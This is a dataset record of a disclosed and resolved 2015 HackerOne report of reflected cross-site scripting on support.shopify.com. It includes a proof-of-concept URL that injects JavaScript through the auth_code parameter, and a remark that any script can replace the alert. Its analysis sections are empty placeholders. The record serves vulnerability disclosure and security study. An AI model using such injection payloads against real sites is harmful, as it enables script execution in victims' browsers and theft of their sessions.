---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '56760'
original_report_id: '56760'
title: XSS on support.shopify.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-04-16T18:59:10.253Z'
disclosed_at: '2015-06-09T22:04:46.094Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS on support.shopify.com

## Metadata

- HackerOne Report ID: 56760
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2015-06-09T22:04:46.094Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello! I would like to report about XSS on support.shopify.com domain.

Here is the PoC that gives alert box with "123" content: https://support.shopify.com/?auth_code=,%20alert(123));//&auth_type=phone\

You can change "alert(123)" in URL to any JavaScript code You want to be executed.

Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
